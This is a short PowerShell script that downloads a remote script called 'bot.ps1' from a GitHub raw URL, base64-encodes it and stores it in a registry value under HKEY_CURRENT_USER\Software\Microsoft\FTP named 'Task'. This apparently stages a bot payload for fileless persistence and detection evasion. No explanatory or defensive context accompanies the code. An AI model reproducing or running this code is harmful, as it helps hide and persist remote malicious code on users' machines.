$wget = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Theoooooo/script-powershell/master/bot.ps1" -UseBasicParsing
$wget.Content
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($wget.Content)

$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText



#New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -PropertyType String -Value $Base64

Set-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -Value $EncodedText
